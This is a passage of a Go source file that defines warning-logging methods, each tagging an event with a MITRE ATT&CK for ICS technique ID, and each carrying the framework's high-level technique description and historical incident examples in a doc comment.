workstation. Often the PLC’s logic Is halted, and all outputs may be forced off.
Run - Execution of the device’s program occurs in this mode. Input and output
(values, points, tags, elements, etc.) are monitored and used according to the
program’s logic. Program Upload and Program Download are disabled while in this
mode. Remote - Allows for remote changes to a PLC’s operation mode. Stop - The
PLC and program is stopped, while in this mode, outputs are forced off. Reset -
Conditions on the PLC are reset to their original states. Warm resets may retain
some memory while cold resets will reset all I/O and data registers. Test /
Monitor mode - Similar to run mode, I/O is processed, although this mode allows
for monitoring, force set, resets, and more generally tuning or debugging of the
system. Often monitor mode may be used as a trial for initialization.
*/
func (g *Session) ATTACKICSDetectOperatingMode(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0868").
        Msg("detect operating mode")
}

/* ATTACKICSDetectProgramState Phases: collection-ics

Adversaries may seek to gather information about the current state of a program
on a PLC. State information reveals information about the program, including
whether it's running, halted, stopped, or has generated an exception. This
information may be leveraged as a verification of malicious program execution or
to determine if a PLC is ready to download a new program.
*/
func (g *Session) ATTACKICSDetectProgramState(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0870").
        Msg("detect program state")
}

/* ATTACKICSDeviceRestartShutdown Phases: inhibit-response-function

Adversaries may forcibly restart or shutdown a device in an ICS environment to
disrupt and potentially negatively impact physical processes. Methods of device
restart and shutdown exist in some devices as built-in, standard
functionalities. These functionalities can be executed using interactive device
web interfaces, CLIs, and network protocol commands. Unexpected restart or
shutdown of control system devices may prevent expected response functions
happening during critical states. A device restart can also be a sign of
malicious device modifications, as many updates require a shutdown in order to
take effect.
*/
func (g *Session) ATTACKICSDeviceRestartShutdown(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0816").
        Msg("device restart/shutdown")
}

/* ATTACKICSDrivebyCompromise Phases: initial-access-ics

Adversaries may gain access to a system during a drive-by compromise, when a
user visits a website as part of a regular browsing session.With this technique,
the user's web browser is targeted and exploited simply by visiting the
compromised website.  The adversary may target a specific community, such as
trusted third party suppliers or other industry specific groups, which often
visit the target website. This kind of targeted attack relies on a common
interest, and is known as a strategic web compromise or watering hole attack.
The National Cyber Awareness System (NCAS) has issued a Technical Alert (TA)
regarding Russian government cyber activity targeting critical infrastructure
sectors.   (Citation: Alert - CISA TA18-074A) Analysis by DHS and FBI has noted
two distinct categories of victims in the Dragonfly campaign on the Western
energy sector: staging and intended targets. The adversary targeted the less
secure networks of staging targets, including trusted third-party suppliers and
related peripheral organizations. Initial access to the intended targets used
watering hole attacks to target process control, ICS, and critical
infrastructure related trade publications and informational websites.
*/
func (g *Session) ATTACKICSDrivebyCompromise(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0817").
        Msg("drive-by compromise")
}

/* ATTACKICSEngineeringWorkstationCompromise Phases: initial-access-ics

Adversaries may compromise and gain control of an engineering workstation for
Initial Access into the control system environment. Access to an engineering
workstation may occur through or physical means, such as a Valid Accounts with
privileged access or infection by removable media. A dual-homed engineering
workstation may allow the adversary access into multiple networks. For example,
unsegregated process control, safety system, or information system networks. An
Engineering Workstation is designed as a reliable computing platform that
configures, maintains, and diagnoses control system equipment and applications.
Compromise of an engineering workstation may provide access to, and control of,
other control system applications and equipment. In the Maroochy attack, the
adversary utilized a computer, possibly stolen, with proprietary engineering
software to communicate with a wastewater system.
*/
func (g *Session) ATTACKICSEngineeringWorkstationCompromise(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0818").
        Msg("engineering workstation compromise")
}

/* ATTACKICSExecutionthroughAPI Phases: execution-ics

Adversaries may attempt to leverage Application Program Interfaces (APIs) used
for communication between control software and the hardware. Specific
functionality is often coded into APIs which can be called by software to engage
specific functions on a device or other software.
*/
func (g *Session) ATTACKICSExecutionthroughAPI(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0871").
        Msg("execution through api")
}

/* ATTACKICSExploitPublicFacingApplication Phases: initial-access-ics

Adversaries may leverage weaknesses to exploit internet-facing software for
initial access into an industrial network. Internet-facing software may be user
applications, underlying networking implementations, an assets operating system,
weak defenses, etc. Targets of this technique may be intentionally exposed for
the purpose of remote management and visibility. An adversary may seek to target
public-facing applications as they may provide direct access into an ICS
environment or the ability to move into the ICS network. Publicly exposed
applications may be found through online tools that scan the internet for open
ports and services. Version numbers for the exposed application may provide
adversaries an ability to target specific known vulnerabilities. Exposed control
protocol or remote access ports found in Commonly Used Port may be of interest
by adversaries.
*/
func (g *Session) ATTACKICSExploitPublicFacingApplication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0819").
        Msg("exploit public-facing application")
}

/* ATTACKICSExploitationforEvasion Phases: evasion-ics

Adversaries may exploit a software vulnerability to take advantage of a
programming error in a program, service, or within the operating system software
or kernel itself to evade detection. Vulnerabilities may exist in software that
can be used to disable or circumvent security features. Adversaries may have
prior knowledge through Control Device Identification about security features
implemented on control devices. These device security features will likely be
targeted directly for exploitation. There are examples of firmware RAM/ROM
consistency checks on control devices being targeted by adversaries to enable
the installation of malicious System Firmware
*/
func (g *Session) ATTACKICSExploitationforEvasion(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0820").
        Msg("exploitation for evasion")
}

/* ATTACKICSExploitationforPrivilegeEscalation Phases: privilege-escalation-ics

Adversaries may exploit software vulnerabilities in an attempt to elevate
privileges. Exploitation of a software vulnerability occurs when an adversary
takes advantage of a programming error in a program, service, or within the
operating system software or kernel itself to execute adversary-controlled code.
Security constructs such as permission levels will often hinder access to
information and use of certain techniques, so adversaries will likely need to
perform privilege escalation to include use of software exploitation to
circumvent those restrictions. When initially gaining access to a system, an
adversary may be operating within a lower privileged process which will prevent
them from accessing certain resources on the system. Vulnerabilities may exist,
usually in operating system components and software commonly running at higher
permissions, that can be exploited to gain higher levels of access on the
system. This could enable someone to move from unprivileged or user level
permissions to SYSTEM or root permissions depending on the component that is
vulnerable. This may be a necessary step for an adversary compromising an
endpoint system that has been properly configured and limits other privilege
escalation methods.
*/
func (g *Session) ATTACKICSExploitationforPrivilegeEscalation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0890").
        Msg("exploitation for privilege escalation")
}

/* ATTACKICSExploitationofRemoteServices Phases: lateral-movement-ics initial-access-ics

Adversaries may exploit a software vulnerability to take advantage of a
programming error in a program, service, or within the operating system software
or kernel itself to enable remote service abuse. A common goal for post-
compromise exploitation of remote services is for lateral movement to enable
access to a remote system. (Citation: EAttack Exploitation of Remote Services)
ICS asset owners and operators have been affected by ransomware (or disruptive
malware masquerading as ransomware) migrating from enterprise IT to ICS
environments: WannaCry, NotPetya, and BadRabbit. In each of these cases, self-
propagating (“wormable”) malware initially infected IT networks, but through
exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to
industrial networks, producing significant impacts. (Citation: Reference -
Dragos - 201910)
*/
func (g *Session) ATTACKICSExploitationofRemoteServices(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0866").
        Msg("exploitation of remote services")
}

/* ATTACKICSExternalRemoteServices Phases: initial-access-ics

Adversaries may leverage external remote services as a point of initial access
into your network. These services allow users to connect to internal network
resources from external locations. Examples are VPNs, Citrix, and other access
mechanisms. Remote service gateways often manage connections and credential
authentication for these services.(Citation: EAttack External Remote Services)
External remote services allow administration of a control system from outside
the system. Often, vendors and internal engineering groups have access to
external remote services to control system networks via the corporate network.
In some cases, this access is enabled directly from the internet. While remote
access enables ease of maintenance when a control system is in a remote area,
compromise of remote access solutions is a liability. The adversary may use
these services to gain access to and execute attacks against a control system
network. Access to valid accounts is often a requirement. As they look for an
entry point into the control system network, adversaries may begin searching for
existing point‐to‐point VPN implementations at trusted third party networks or
through remote support employee connections where split tunneling is
enabled.(Citation: Ukraine15 - EISAC - 201603) In the Maroochy Attack, the
adversary was able to gain remote computer access to the system over radio.
*/
func (g *Session) ATTACKICSExternalRemoteServices(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0822").
        Msg("external remote services")
}

/* ATTACKICSGraphicalUserInterface Phases: execution-ics

Adversaries may attempt to gain access to a machine via a Graphical User
Interface (GUI) to enhance execution capabilities. Access to a GUI allows a user
to interact with a computer in a more visual manner than a CLI. A GUI allows
users to move a cursor and click on interface objects, with a mouse and keyboard
as the main input devices, as opposed to just using the keyboard. If physical
access is not an option, then access might be possible via protocols such as VNC
on Linux-based and Unix-based operating systems, and RDP on Windows operating
systems. An adversary can use this access to execute programs and applications
on the target machine.
*/
func (g *Session) ATTACKICSGraphicalUserInterface(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0823").
        Msg("graphical user interface")
}

/* ATTACKICSHooking Phases: execution-ics privilege-escalation-ics

Adversaries may hook into application programming interface (API) functions used
by processes to redirect calls for persistent means. Windows processes often
leverage these API functions to perform tasks that require reusable system
resources. Windows API functions are typically stored in dynamic-link libraries
(DLLs) as exported functions. (Citation: EAttack Hooking) One type of hooking
seen in ICS involves redirecting calls to these functions via import address
table (IAT) hooking. IAT hooking uses modifications to a process’s IAT, where
pointers to imported API functions are stored. (Citation: Stuxnet - Symantec -
201102)
*/
func (g *Session) ATTACKICSHooking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0874").
        Msg("hooking")
}

/* ATTACKICSIOImage Phases: collection-ics

Adversaries may seek to capture process image values related to the inputs and
outputs of a PLC. Within a PLC all input and output states are stored into an
I/O image. This image is used by the user program instead of directly
interacting with physical I/O. (Citation: PLC-Blaster 2)
*/
func (g *Session) ATTACKICSIOImage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0877").
        Msg("i/o image")
}

/* ATTACKICSIOModuleDiscovery Phases: discovery-ics

Adversaries may use input/output (I/O) module discovery to gather key
information about a control system device. An I/O module is a device that allows
the control system device to either receive or send signals to other devices.
These signals can be analog or digital, and may support a number of different
protocols. Devices are often able to use attachable I/O modules to increase the
number of inputs and outputs that it can utilize. An adversary with access to a
device can use native device functions to enumerate I/O modules that are
connected to the device. Information regarding the I/O modules can aid the
adversary in understanding related control processes.
*/
func (g *Session) ATTACKICSIOModuleDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0824").
        Msg("i/o module discovery")
}

/* ATTACKICSIndicatorRemovalonHost Phases: evasion-ics

Adversaries may attempt to remove indicators of their presence on a system in an
effort to cover their tracks. In cases where an adversary may feel detection is
imminent, they may try to overwrite, delete, or cover up changes they have made
to the device.
*/
func (g *Session) ATTACKICSIndicatorRemovalonHost(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0872").
        Msg("indicator removal on host")
}

/* ATTACKICSInternetAccessibleDevice Phases: initial-access-ics

Adversaries may gain access into industrial environments through systems exposed
directly to the internet for remote access rather than through External Remote
Services. Internet Accessible Devices are exposed to the internet
unintentionally or intentionally without adequate protections. This may allow
for adversaries to move directly into the control system network. Access onto
these devices is accomplished without the use of exploits, these would be
represented within the Exploit Public-Facing Application technique. Adversaries
may leverage built in functions for remote access which may not be protected or
utilize minimal legacy protections that may be targeted.(Citation: Bowman Dam -
ICS-CERT) In the case of the Bowman dam incident, adversaries leveraged access
to the dam control network through a cellular modem. Access to the device was
protected by password authentication, although the application was vulnerable to
brute forcing.(Citation: Bowman Dam - ICS-CERT)(Citation: Bowman Dam - wall
street journal)(Citation: owman Dam - Times) In Trend Micro’s manufacturing
deception operations adversaries were detected leveraging direct internet access
to an ICS environment through the exposure of operational protocols such as
Siemens S7, Omron FINS, and EtherNet/IP, in addition to misconfigured VNC
access.(Citation: Trend Micro Honeypot)
*/
func (g *Session) ATTACKICSInternetAccessibleDevice(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0883").
        Msg("internet accessible device")
}

/* ATTACKICSLocationIdentification Phases: collection-ics

Adversaries may perform location identification using device data to inform
operations and targeted impact for attacks. Location identification data can
come in a number of forms, including geographic location, location relative to
other control system devices, time zone, and current time. An adversary may use
an embedded global positioning system (GPS) module in a device to figure out the
physical coordinates of a device. NIST SP800-82 recommends that devices utilize
GPS or another location determining mechanism to attach appropriate timestamps
to log entries (Citation: Guidance - NIST SP800-82). While this assists in
logging and event tracking, an adversary could use the underlying positioning
mechanism to determine the general location of a device. An adversary can also
infer the physical location of serially connected devices by using serial
connection enumeration.  An adversary attempt to attack and cause Impact could
potentially affect other control system devices in close proximity. Device
local-time and time-zone settings can also provide adversaries a rough indicator
of device location, when specific geographic identifiers cannot be determined
from the system.
*/
func (g *Session) ATTACKICSLocationIdentification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0825").
        Msg("location identification")
}

/* ATTACKICSLossofAvailability Phases: impact-ics

Adversaries may attempt to disrupt essential components or systems to prevent
owner and operator from delivering products or services. (Citation: Reference -
Corero) (Citation: Reference - SANS - 201510) (Citation: Reference - RIoT)
Adversaries may leverage malware to delete or encrypt critical data on HMIs,
workstations, or databases.
*/
func (g *Session) ATTACKICSLossofAvailability(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0826").
        Msg("loss of availability")
}

/* ATTACKICSLossofControl Phases: impact-ics

Adversaries may seek to achieve a sustained loss of control or a runaway
condition in which operators cannot issue any commands even if the malicious
interference has subsided.(Citation: Reference - Corero)(Citation: Reference -
SANS - 201510)(Citation: Reference - RIoT) The German Federal Office for
Information Security (BSI) reported a targeted attack on a steel mill in its
2014 IT Security Report.(Citation: BSI IT Security Situation 2014) These
targeted attacks affected industrial operations and resulted in breakdowns of
control system components and even entire installations. As a result of these
breakdowns, massive impact resulted in damage and unsafe conditions from the
uncontrolled shutdown of a blast furnace.
*/
func (g *Session) ATTACKICSLossofControl(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0827").
        Msg("loss of control")
}

/* ATTACKICSLossofProductivityandRevenue Phases: impact-ics

Adversaries may cause loss of productivity and revenue through disruption and
even damage to the availability and integrity of control system operations,
devices, and related processes. This technique may manifest as a direct effect
of an ICS-targeting attack or tangentially, due to an IT-targeting attack
against non-segregated environments. In some cases, this may result from the
postponement and disruption of ICS operations and production as part of a
remediation effort. Operations may be brought to a halt and effectively stopped
in an effort to contain and properly remove malware or due to the Loss of
Safety.
*/
func (g *Session) ATTACKICSLossofProductivityandRevenue(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0828").
        Msg("loss of productivity and revenue")
}

/* ATTACKICSLossofProtection Phases: impact-ics

Adversaries may compromise protective system functions designed to prevent the
effects of faults and abnormal conditions. This can result in equipment damage,
prolonged process disruptions and hazards to personnel. Many faults and abnormal
conditions in process control happen too quickly for a human operator to react
to. Speed is critical in correcting these conditions to limit serious impacts
such as Loss of Control and Property Damage. Adversaries may target and disable
protective system functions as a prerequisite to subsequent attack execution or
to allow for future faults and abnormal conditions to go unchecked. Detection of
a Loss of Protection by operators can result in the shutdown of a process due to
strict policies regarding protection systems. This can cause a Loss of
Productivity and Revenue and may meet the technical goals of adversaries seeking
to cause process disruptions.
*/
func (g *Session) ATTACKICSLossofProtection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0837").
        Msg("loss of protection")
}

/* ATTACKICSLossofSafety Phases: impact-ics

Adversaries may compromise safety system functions designed to maintain safe
operation of a process when unacceptable or dangerous conditions occur. Safety
systems are often composed of the same elements as control systems but have the
sole purpose of ensuring the process fails in a predetermined safe manner. Many
unsafe conditions in process control happen too quickly for a human operator to
react to. Speed is critical in correcting these conditions to limit serious
impacts such as Loss of Control and Property Damage. Adversaries may target and
disable safety system functions as a prerequisite to subsequent attack execution
or to allow for future unsafe conditionals to go unchecked. Detection of a Loss
of Safety by operators can result in the shutdown of a process due to strict
policies regarding safety systems. This can cause a Loss of Productivity and
Revenue and may meet the technical goals of adversaries seeking to cause process
disruptions.
*/
func (g *Session) ATTACKICSLossofSafety(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0880").
        Msg("loss of safety")
}

/* ATTACKICSLossofView Phases: impact-ics

Adversaries may cause a sustained or permanent loss of view where the ICS
equipment will require local, hands-on operator intervention; for instance, a
restart or manual operation. By causing a sustained reporting or visibility
loss, the adversary can effectively hide the present state of operations. This
loss of view can occur without affecting the physical processes themselves.
(Citation: Reference - Corero) (Citation: Reference - SANS - 201510) (Citation:
Reference - RIoT)
*/
func (g *Session) ATTACKICSLossofView(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0829").
        Msg("loss of view")
}

/* ATTACKICSManintheMiddle Phases: collection-ics

Adversaries with privileged network access may seek to modify network traffic in
real time using man-in-the-middle (MITM) attacks. (Citation: Reference - SANS -
201710) This type of attack allows the adversary to intercept traffic to and/or
from a particular device on the network. If a MITM attack is established, then
the adversary has the ability to block, log, modify, or inject traffic into the
communication stream. There are several ways to accomplish this attack, but some
of the most-common are Address Resolution Protocol (ARP) poisoning and the use
of a proxy. (Citation: Research - Research - Taxonomy Cyber Attacks on SCADA)  A
MITM attack may allow an adversary to perform the following attacks: Block
Reporting Message, Spoof Reporting Message, Modify Parameter, Unauthorized
Command Message
*/
func (g *Session) ATTACKICSManintheMiddle(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0830").
        Msg("man in the middle")
}

/* ATTACKICSManipulateIOImage Phases: inhibit-response-function

Adversaries may manipulate the I/O image of PLCs through various means to
prevent them from functioning as expected. Methods of I/O image manipulation may
include overriding the I/O table via direct memory manipulation or using the
override function used for testing PLC programs. (Citation: Guidance - ISA PLC)
During the PLC scan cycle, the state of the actual physical inputs is copied to
a portion of the PLC memory, commonly called the input image table. When the
program is scanned, it examines the input image table to read the state of a
physical input.  When the logic determines the state of a physical output, it
writes to a portion of the PLC memory commonly called the output image table.
The output image may also be examined during the program scan. To update the
physical outputs, the output image table contents are copied to the physical
outputs after the program is scanned. One of the unique characteristics of PLCs
is their ability to override the status of a physical discrete input or to
override the logic driving a physical output coil and force the output to a
desired status.
*/
func (g *Session) ATTACKICSManipulateIOImage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0835").
        Msg("manipulate i/o image")
}

/* ATTACKICSManipulationofControl Phases: impact-ics

Adversaries may manipulate physical process control within the industrial
environment. Methods of manipulating control can include changes to set point
values, tags, or other parameters. Adversaries may manipulate control systems
devices or possibly leverage their own, to communicate with and command physical
control processes. The duration of manipulation may be temporary or longer
sustained, depending on operator detection. Methods of Manipulation of Control
include: Man-in-the-middle, Spoof command message, Changing setpoints. A Polish
student used a remote controller device to interface with the Lodz city tram
system in Poland.(Citation: LondonReconnections Hacked Cyber Security Railways
May 2017)(Citation: InHomelandSecurity Hacker Poland February 2008)(Citation:
Schneier Hacking Polish Trams January 2008) Using this remote, the student was
able to capture and replay legitimate tram signals. As a consequence, four trams
were derailed and twelve people injured due to resulting emergency
stops.(Citation: InHomelandSecurity Hacker Poland February 2008)Using this
remote, the student was able to capture and replay legitimate tram signals. As a
consequence, four trams were derailed and twelve people injured due to resulting
emergency stops.(Citation: InHomelandSecurity Hacker Poland February 2008) The
track controlling commands issued may have also resulted in tram collisions, a
further risk to those on board and nearby the areas of impact.(Citation:
Schneier Hacking Polish Trams January 2008)
*/
func (g *Session) ATTACKICSManipulationofControl(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0831").
        Msg("manipulation of control")
}

/* ATTACKICSManipulationofView Phases: impact-ics

Adversaries may attempt to manipulate the information reported back to operators
or controllers. This manipulation may be short term or sustained. During this
time the process itself could be in a much different state than what is
reported. (Citation: Reference - Corero) (Citation: Reference - SANS - 201510)
(Citation: Reference - RIoT)  Operators may be fooled into doing something that
is harmful to the system in a loss of view situation. With a manipulated view
into the systems, operators may issue inappropriate control sequences that
introduce faults or catastrophic failures into the system. Business analysis
systems can also be provided with inaccurate data leading to bad management
decisions.
*/
func (g *Session) ATTACKICSManipulationofView(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0832").
        Msg("manipulation of view")
}

/* ATTACKICSMasquerading Phases: evasion-ics

Adversaries may use masquerading to disguise a malicious application or
executable as another file, to avoid operator and engineer suspicion. Possible
disguises of these masquerading files can include commonly found programs,
expected vendor executables and configuration files, and other commonplace
application and naming conventions. By impersonating expected and vendor-
relevant files and applications, operators and engineers may not notice the
presence of the underlying malicious content and possibly end up running those
masquerading as legitimate functions.  Applications and other files commonly
found on Windows systems or in engineering workstations have been impersonated
before. This can be as simple as renaming a file to effectively disguise it in
the ICS environment.
*/
func (g *Session) ATTACKICSMasquerading(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0849").
        Msg("masquerading")
}

/* ATTACKICSModifyAlarmSettings Phases: inhibit-response-function

Adversaries may modify alarm settings to prevent alerts that may inform
operators of their presence or to prevent responses to dangerous and unintended
scenarios. Reporting messages are a standard part of data acquisition in control
systems. Reporting messages are used as a way to transmit system state
information and acknowledgements that specific actions have occurred. These
messages provide vital information for the management of a physical process, and
keep operators, engineers, and administrators aware of the state of system
devices and physical processes. If an adversary is able to change the reporting
settings, certain events could be prevented from being reported. This type of
modification can also prevent operators or devices from performing actions to
keep the system in a safe state. If critical reporting messages cannot trigger
these actions then a Impact could occur. In ICS environments, the adversary may
have to use Alarm Suppression or contend with multiple alarms and/or alarm
propagation to achieve a specific goal to evade detection or prevent intended
responses from occurring.  (Citation: References - Secura - 2019) Methods of
suppression often rely on modification of alarm settings, such as modifying in
memory code to fixed values or tampering with assembly level instruction code.
In the Maroochy Attack, the adversary disabled alarms at four pumping stations.
This caused alarms to not be reported to the central computer. (Citation:
Maroochy - MITRE - 200808)
*/
func (g *Session) ATTACKICSModifyAlarmSettings(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0838").
        Msg("modify alarm settings")
}

/* ATTACKICSModifyControllerTasking Phases: execution-ics

Adversaries may modify the tasking of a controller to allow for the execution of
their own programs. This can allow an adversary to manipulate the execution flow
and behavior of a controller. According to 61131-3, the association of a Task
with a Program Organization Unit (POU) defines a task association. An adversary
may modify these associations or create new ones to manipulate the execution
flow of a controller. Modification of controller tasking can be accomplished
using a Program Download in addition to other types of program modification such
as online edit and program append. Tasks have properties, such as interval,
frequency and priority to meet the requirements of program execution. Some
controller vendors implement tasks with implicit, pre-defined properties whereas
others allow for these properties to be formulated explicitly. An adversary may
associate their program with tasks that have a higher priority or execute
associated programs more frequently. For instance, to ensure cyclic execution of
their program on a Siemens controller, an adversary may add their program to the
“task”, Organization Block 1 (OB1).
*/
func (g *Session) ATTACKICSModifyControllerTasking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0821").
        Msg("modify controller tasking")
}

/* ATTACKICSModifyControlLogic Phases: impair-process-control inhibit-response-function

Adversaries may place malicious code in a system, which can cause the system to
malfunction by modifying its control logic. Control system devices use
programming languages (e.g. relay ladder logic) to control physical processes by
affecting actuators, which cause machines to operate, based on environment
sensor readings. These devices often include the ability to perform remote
control logic updates.  Program code is normally edited in a vendor-specific
Integrated Development Environment (IDE) that relies on proprietary tools and
features. These IDEs allow an engineer to perform host target development and
may have the ability to run the code on the machine it is programmed for. The
IDE will transmit the control logic to the testing device, and will perform the
required device-specific functions to apply the changes and make them active. An
adversary may attempt to use this host target IDE to modify device control
logic. Even though proprietary tools are often used to edit and update control
logic, the process can usually be reverse-engineered and reproduced with open-
source tools. An adversary can de-calibrate a sensor by removing functions in
control logic that account for sensor error. This can be used to change a
control process without actually spoofing command messages to a controller or
device.  It is believed this process happened in the lesser known over-
pressurizer attacks build into Stuxnet. Pressure sensors are not perfect at
translating pressure into an analog output signal, but their errors can be
corrected by calibration. The pressure controller can be told what the “real”
pressure is for given analog signals and then automatically linearize the
measurement to what would be the “real” pressure. If the linearization is
overwritten by malicious code on the S7-417 controller, analog pressure readings
will be “corrected” during the attack by the pressure controller, which then
interprets all analog pressure readings as perfectly normal pressure no matter
how high or low their analog values are. The pressure controller then acts
accordingly by never opening the stage exhaust valves. In the meantime, actual
pressure keeps rising. (Citation: Stuxnet - Langner - 201311) In the Maroochy
Attack, Vitek Boden gained remote computer access to the control system and
altered data so that whatever function should have occurred at affected pumping
stations did not occur or occurred in a different way. The software program
installed in the laptop was one developed by Hunter Watertech for its use in
changing configurations in the PDS computers. This ultimately led to 800,000
liters of raw sewage being spilled out into the community. (Citation: Maroochy -
MITRE - 200808)
*/
func (g *Session) ATTACKICSModifyControlLogic(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0833").
        Msg("modify control logic")
}

/* ATTACKICSModifyParameter Phases: impair-process-control

Adversaries may modify parameters used to instruct industrial control system
devices. These devices operate via programs that dictate how and when to perform
actions based on such parameters. Such parameters can determine the extent to
which an action is performed and may specify additional options. For example, a
program on a control system device dictating motor processes may take a
parameter defining the total number of seconds to run that motor.     An
adversary can potentially modify these parameters to produce an outcome outside
of what was intended by the operators. By modifying system and process critical
parameters, the adversary may cause Impact to equipment and/or control
processes. Modified parameters may be turned into dangerous, out-of-bounds, or
unexpected values from typical operations. For example, specifying that a
process run for more or less time than it should, or dictating an unusually
high, low, or invalid value as a parameter.  In the Maroochy Attack, Vitek Boden
gained remote computer access to the control system and altered data so that
whatever function should have occurred at affected pumping stations did not
occur or occurred in a different way. The software program installed in the
laptop was one developed by Hunter Watertech for its use in changing
configurations in the PDS computers. This ultimately led to 800,000 liters of
raw sewage being spilled out into the community. (Citation: Maroochy - MITRE -
200808)
*/
func (g *Session) ATTACKICSModifyParameter(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0836").
        Msg("modify parameter")
}

/* ATTACKICSModuleFirmware Phases: persistence-ics impair-process-control

Adversaries may install malicious or vulnerable firmware onto modular hardware
devices. Control system devices often contain modular hardware devices. These
devices may have their own set of firmware that is separate from the firmware of
the main control system equipment.  This technique is similar to System
Firmware, but is conducted on other system components that may not have the same
capabilities or level of integrity checking. Although it results in a device re-
image, malicious device firmware may provide persistent access to remaining
devices. (Citation: References - Module Firmware) An easy point of access for an
adversary is the Ethernet card, which may have its own CPU, RAM, and operating
system. The adversary may attack and likely exploit the computer on an Ethernet
card. Exploitation of the Ethernet card computer may enable the adversary to
accomplish additional attacks, such as the following: (Citation: References -
Module Firmware) *Delayed Attack - The adversary may stage an attack in advance
and choose when to launch it, such as at a particularly damaging time. *Brick
the Ethernet Card - Malicious firmware may be programmed to result in an
Ethernet card failure, requiring a factory return. *"Random" Attack or Failure -
The adversary may load malicious firmware onto multiple field devices. Execution
of an attack and the time it occurs is generated by a pseudo-random number
generator.  *A Field Device Worm - The adversary may choose to identify all
field devices of the same model, with the end goal of performing a device-wide
compromise. *Attack Other Cards on the Field Device - Although it is not the
most important module in a field device, the Ethernet card is most accessible to
the adversary and malware. Compromise of the Ethernet card may provide a more
direct route to compromising other modules, such as the CPU module.
*/
func (g *Session) ATTACKICSModuleFirmware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0839").
        Msg("module firmware")
}

/* ATTACKICSModifyProgram Phases: persistence-ics

Adversaries may modify or add a program on a controller to affect how it
interacts with the physical process, peripheral devices and other hosts on the
network. Modification to controller programs can be accomplished using a Program
Download in addition to other types of program modification such as online edit
and program append. Program modification encompasses the addition and
modification of instructions and logic contained in Program Organization Units
(POU) and similar programming elements found on controllers. This can include,
for example, adding new functions to a controller, modifying the logic in
existing functions and making new calls from one function to another. Some
programs may allow an adversary to interact directly with the native API of the
controller to take advantage of obscure features or vulnerabilities.
*/
func (g *Session) ATTACKICSModifyProgram(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0889").
        Msg("modify program")
}

/* ATTACKICSMonitorProcessState Phases: collection-ics

Adversaries may gather information about the physical process state. This
information may be used to gain more information about the process itself or
used as a trigger for malicious actions. The sources of process state
information may vary such as, OPC tags, historian data, specific PLC block
information, or network traffic.
*/
func (g *Session) ATTACKICSMonitorProcessState(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0801").
        Msg("monitor process state")
}

/* ATTACKICSNetworkConnectionEnumeration Phases: discovery-ics

Adversaries may perform network connection enumeration to discover information
about device communication patterns. If an adversary can inspect the state of a
network connection with tools, such as [https://en.wikipedia.org/wiki/Netstat
netstat], in conjunction with System Firmware, then they can determine the role
of certain devices on the network  (Citation: EAttack System Network Connections
Discovery). The adversary can also use Network Sniffing to watch network traffic
for details about the source, destination, protocol, and content.
*/
func (g *Session) ATTACKICSNetworkConnectionEnumeration(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0840").
        Msg("network connection enumeration")
}

/* ATTACKICSNetworkServiceScanning Phases: discovery-ics

Network Service Scanning is the process of discovering services on networked
systems.  This can be achieved through a technique called port scanning or
probing.  Port scanning interacts with the TCP/IP ports on a target system to
determine whether ports are open, closed, or filtered by a firewall.  This does
not reveal the service that is running behind the port, but since many common
services are run on [https://www.iana.org/assignments/service-names-port-
numbers/service-names-port-numbers.xhtml specific port numbers], the type of
service can be assumed.  More in-depth testing includes interaction with the
actual service to determine the service type and specific version.  One of the
most-popular tools to use for Network Service Scanning is [https://nmap.org/
Nmap]. An adversary may attempt to gain information about a target device and
its role on the network via Network Service Scanning techniques, such as port
scanning.  Network Service Scanning is useful for determining potential
vulnerabilities in services on target devices.  Network Service Scanning is
closely tied to . Scanning ports can be noisy on a network. In some attacks,
adversaries probe for specific ports using custom tools. This was specifically
seen in the Triton and PLC-Blaster attacks.
*/
func (g *Session) ATTACKICSNetworkServiceScanning(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0841").
        Msg("network service scanning")
}

